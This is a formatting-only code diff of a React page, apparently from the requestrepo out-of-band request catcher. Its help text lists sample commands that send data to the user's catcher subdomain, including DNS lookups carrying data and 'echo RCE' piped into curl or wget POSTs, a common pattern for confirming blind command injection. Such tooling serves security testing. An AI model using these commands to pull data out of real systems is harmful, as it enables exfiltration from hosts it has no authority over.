@@ -37,7 +37,11 @@ export function RequestsPage({ user, sharedRequest }) {
     }
 
     // Priority 2: Show user's selected request if valid
-    if (user.selectedRequest && user.requests && user.requests[user.selectedRequest]) {
+    if (
+      user.selectedRequest &&
+      user.requests &&
+      user.requests[user.selectedRequest]
+    ) {
       setSelectedRequest(user.requests[user.selectedRequest]);
       return;
     }
@@ -52,12 +56,12 @@ export function RequestsPage({ user, sharedRequest }) {
     // If no requests available, set to null
     setSelectedRequest(null);
   }, [
-    sharedRequest, 
-    user, 
+    sharedRequest,
+    user,
     // Track specific changes to avoid dependency on the entire user object
-    user?.selectedRequest, 
+    user?.selectedRequest,
     // This stringified value changes when requests are added/removed
-    user?.requests ? Object.keys(user.requests).length : 0
+    user?.requests ? Object.keys(user.requests).length : 0,
   ]);
 
   const handleEditorFocus = () => {
@@ -84,9 +88,7 @@ export function RequestsPage({ user, sharedRequest }) {
   // parse url into host:port
   let url;
   try {
-    url = new URL(
-      "http://" + (user?.domain || window.location.hostname) + "/",
-    );
+    url = new URL("http://" + (user?.domain || window.location.hostname) + "/");
   } catch {
     url = new URL("http://" + window.location.hostname + "/");
   }
@@ -107,82 +109,80 @@ print("Latest Request:", new_request)`;
 
   return (
     <div className="card card-w-title card-body">
-      {(!selectedRequest || (Object.keys(user?.requests || {}).length === 0 && !sharedRequest)) && (
-          <div className="grid">
-            <div className="col-12">
-              <h1>Awaiting requests</h1>
-              <p>How to make a request:</p>
-              <code>
-                curl http://
-                {user?.url || `${user?.subdomain}.${user?.domain}`}
-              </code>
-              <br />
-              <br />
-              <code>
-                curl http://{user.domain}/r/
-                {user?.subdomain || "default"}/
-              </code>
-              <br />
-              <br />
-              <code>
-                curl -X POST --data hello http://
-                {user?.url || `${user?.subdomain}.${user?.domain}`}
-              </code>
-              <br />
-              <br />
-              <code>
-                nslookup your.data.here.
-                {user?.url || `${user?.subdomain}.${user?.domain}`}
-              </code>
-              <br />
-              <br />
-              <code>
-                echo RCE | curl -d @-{" "}
-                {user?.url || `${user?.subdomain}.${user?.domain}`}
-              </code>
-              <br />
-              <br />
-              <code>
-                wget --post-data "$(echo RCE)" -O-{" "}
-                {user?.url || `${user?.subdomain}.${user?.domain}`}
-              </code>
-              <br />
-              <br />
-              <p>
-                Check out the Response tab to edit your HTTP Response or the
-                DNS tab to add DNS records for this subdomain.
-              </p>
-              <p>
-                Automate requests/responses using the{" "}
-                <a
-                  href="https://github.com/adrgs/requestrepo-lib"
-                  target="_blank"
-                  rel="noreferrer"
-                >
-                  requestrepo
-                </a>{" "}
-                Python library:
-              </p>
-              <CopyButton
-                text={content.replace(
-                  "********",
-                  activeSession.token,
-                )}
-              />
-              <EditorComponent
-                value={content}
-                onChange={() => {}}
-                commands={[]}
-                language={"python"}
-                onFocus={handleEditorFocus}
-                onBlur={handleEditorBlur}
-              />
-            </div>
+      {(!selectedRequest ||
+        (Object.keys(user?.requests || {}).length === 0 && !sharedRequest)) && (
+        <div className="grid">
+          <div className="col-12">
+            <h1>Awaiting requests</h1>
+            <p>How to make a request:</p>
+            <code>
+              curl http://
+              {user?.url || `${user?.subdomain}.${user?.domain}`}
+            </code>
+            <br />
+            <br />
+            <code>
+              curl http://{user.domain}/r/
+              {user?.subdomain || "default"}/
+            </code>
+            <br />
+            <br />
+            <code>
+              curl -X POST --data hello http://
+              {user?.url || `${user?.subdomain}.${user?.domain}`}
+            </code>
+            <br />
+            <br />
+            <code>
+              nslookup your.data.here.
+              {user?.url || `${user?.subdomain}.${user?.domain}`}
+            </code>
+            <br />
+            <br />
+            <code>
+              echo RCE | curl -d @-{" "}
+              {user?.url || `${user?.subdomain}.${user?.domain}`}
+            </code>
+            <br />
+            <br />
+            <code>
+              wget --post-data "$(echo RCE)" -O-{" "}
+              {user?.url || `${user?.subdomain}.${user?.domain}`}
+            </code>
+            <br />
+            <br />
+            <p>
+              Check out the Response tab to edit your HTTP Response or the DNS
+              tab to add DNS records for this subdomain.
+            </p>
+            <p>
+              Automate requests/responses using the{" "}
+              <a
+                href="https://github.com/adrgs/requestrepo-lib"
+                target="_blank"
+                rel="noreferrer"
+              >
+                requestrepo
+              </a>{" "}
+              Python library:
+            </p>
+            <CopyButton
+              text={content.replace("********", activeSession.token)}
+            />
+            <EditorComponent
+              value={content}
+              onChange={() => {}}
+              commands={[]}
+              language={"python"}
+              onFocus={handleEditorFocus}
+              onBlur={handleEditorBlur}
+            />
           </div>
-        )}
+        </div>
+      )}
       {selectedRequest && (
-        <RequestInfo 
-          request={selectedRequest} 
+        <RequestInfo
+          request={selectedRequest}
           isShared={selectedRequest === sharedRequest}
         />
       )}
